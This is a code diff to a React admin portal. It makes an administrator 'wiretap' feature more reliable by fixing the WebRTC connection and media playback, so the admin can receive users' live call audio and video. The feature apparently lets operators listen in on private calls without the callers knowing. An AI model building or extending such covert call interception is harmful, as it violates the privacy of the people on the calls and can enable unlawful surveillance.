@@ -38,6 +38,8 @@ export default function AdminPortal({ onClose }) {
   const wiretapStreamRef = useRef(null);
   const wiretapVideoRef = useRef(null);
   const wiretapAudioRef = useRef(null);
+  const wiretapIceQueueRef = useRef([]);
+  const wiretapRemoteSetRef = useRef(false);
 
   // Mobile responsiveness & mobile chat view state
   const checkIsMobileDevice = () => {
@@ -127,6 +129,7 @@ export default function AdminPortal({ onClose }) {
         );
 
     if (liveMatch) {
+      console.log('[Admin Wiretap] Starting live tap:', liveMatch.roomId, liveMatch.callerSocketId);
       setWiretapStatus('connecting');
       setWiretapNote('Connecting live audio/video WebRTC stream...');
       socket.emit('admin-wiretap-start', {
@@ -160,12 +163,40 @@ export default function AdminPortal({ onClose }) {
         .catch(() => {});
     };
 
+    const waitWiretapIce = (pc, maxMs = 700) => new Promise((resolve) => {
+      if (!pc || pc.iceGatheringState === 'complete') { resolve(); return; }
+      let done = false;
+      let timer = null;
+      const finish = () => {
+        if (done) return;
+        done = true;
+        pc.removeEventListener('icegatheringstatechange', onState);
+        pc.removeEventListener('icecandidate', onCand);
+        clearTimeout(hard);
+        if (timer) clearTimeout(timer);
+        resolve();
+      };
+      const onState = () => { if (pc.iceGatheringState === 'complete') finish(); };
+      const onCand = (ev) => {
+        const c = ev?.candidate?.candidate || '';
+        if (c.includes(' srflx ') || c.includes(' relay ') || c.includes(' typ host ')) {
+          if (!timer) timer = setTimeout(finish, 150);
+        }
+      };
+      const hard = setTimeout(finish, maxMs);
+      pc.addEventListener('icegatheringstatechange', onState);
+      pc.addEventListener('icecandidate', onCand);
+    });
+
     const handleWiretapOffer = async ({ fromSocketId, signal, isVideo }) => {
       if (!fromSocketId || !signal) return;
+      console.log('[Admin Wiretap] Received offer from:', fromSocketId, 'isVideo:', isVideo);
       try {
         if (wiretapPcRef.current) {
           try { wiretapPcRef.current.close(); } catch {}
         }
+        wiretapRemoteSetRef.current = false;
+        wiretapIceQueueRef.current = [];
         wiretapPeerSocketRef.current = fromSocketId;
         const pc = new RTCPeerConnection(ICE_SERVERS);
         wiretapPcRef.current = pc;
@@ -174,16 +205,16 @@ export default function AdminPortal({ onClose }) {
         wiretapStreamRef.current = stream;
 
         pc.ontrack = (ev) => {
-          const incomingStream = ev.streams?.[0];
-          if (incomingStream) {
-            incomingStream.getTracks().forEach(t => {
-              if (!stream.getTracks().some(existing => existing.id === t.id)) {
-                stream.addTrack(t);
-              }
-            });
-          } else if (ev.track && !stream.getTracks().some(existing => existing.id === ev.track.id)) {
-            stream.addTrack(ev.track);
-          }
+          const incomingTracks = ev.streams?.[0]?.getTracks?.() || [ev.track];
+          incomingTracks.forEach(t => {
+            t.enabled = true;
+            if (!stream.getTracks().some(existing => existing.id === t.id)) {
+              stream.addTrack(t);
+            }
+          });
+          ev.track.onunmute = () => {
+            attachWiretapMediaToElements(wiretapStreamRef.current);
+          };
           setWiretapStatus('live');
           setWiretapNote(isVideo ? 'Live audio & video stream active' : 'Live audio stream active');
           attachWiretapMediaToElements(stream);
@@ -199,7 +230,12 @@ export default function AdminPortal({ onClose }) {
           }
         };
 
+        pc.oniceconnectionstatechange = () => {
+          console.log('[Admin Wiretap] ICE state:', pc.iceConnectionState);
+        };
+
         pc.onconnectionstatechange = () => {
+          console.log('[Admin Wiretap] Connection state:', pc.connectionState);
           if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed' || pc.connectionState === 'closed') {
             setWiretapStatus('ended');
             setWiretapNote('Live call ended. Checking saved recordings...');
@@ -207,9 +243,16 @@ export default function AdminPortal({ onClose }) {
         };
 
         await pc.setRemoteDescription(new RTCSessionDescription(signal));
+        wiretapRemoteSetRef.current = true;
+        while (wiretapIceQueueRef.current.length > 0) {
+          const cand = wiretapIceQueueRef.current.shift();
+          try { await pc.addIceCandidate(new RTCIceCandidate(cand)); } catch {}
+        }
+
         const answer = await pc.createAnswer();
         await pc.setLocalDescription(answer);
-        socket.emit('admin-wiretap-answer', { toSocketId: fromSocketId, signal: answer });
+        await waitWiretapIce(pc, 700);
+        socket.emit('admin-wiretap-answer', { toSocketId: fromSocketId, signal: pc.localDescription || answer });
       } catch (err) {
         console.warn('[Admin Wiretap] Offer failed:', err);
         setWiretapStatus('ended');
@@ -218,12 +261,14 @@ export default function AdminPortal({ onClose }) {
     };
 
     const handleWiretapIce = async ({ candidate, fromRole }) => {
-      if (fromRole === 'admin') return;
-      if (wiretapPcRef.current && candidate) {
-        try {
-          await wiretapPcRef.current.addIceCandidate(new RTCIceCandidate(candidate));
-        } catch {}
+      if (fromRole === 'admin' || !candidate) return;
+      if (!wiretapPcRef.current || !wiretapRemoteSetRef.current) {
+        wiretapIceQueueRef.current.push(candidate);
+        return;
       }
+      try {
+        await wiretapPcRef.current.addIceCandidate(new RTCIceCandidate(candidate));
+      } catch {}
     };
 
     const handleWiretapUnavailable = ({ reason }) => {
@@ -1641,6 +1686,8 @@ export default function AdminPortal({ onClose }) {
                               playsInline
                               muted
                               controls
+                              onLoadedMetadata={() => wiretapVideoRef.current?.play().catch(() => {})}
+                              onCanPlay={() => wiretapVideoRef.current?.play().catch(() => {})}
                               style={{
                                 display: wiretapHasVideo ? 'block' : 'none',
                                 width: '100%',
@@ -1652,7 +1699,9 @@ export default function AdminPortal({ onClose }) {
                             <audio
                               ref={wiretapAudioRef}
                               autoPlay
+                              playsInline
                               controls
+                              onCanPlay={() => wiretapAudioRef.current?.play().catch(() => {})}
                               style={{ width: '100%', height: '38px' }}
                             />
                           </div>
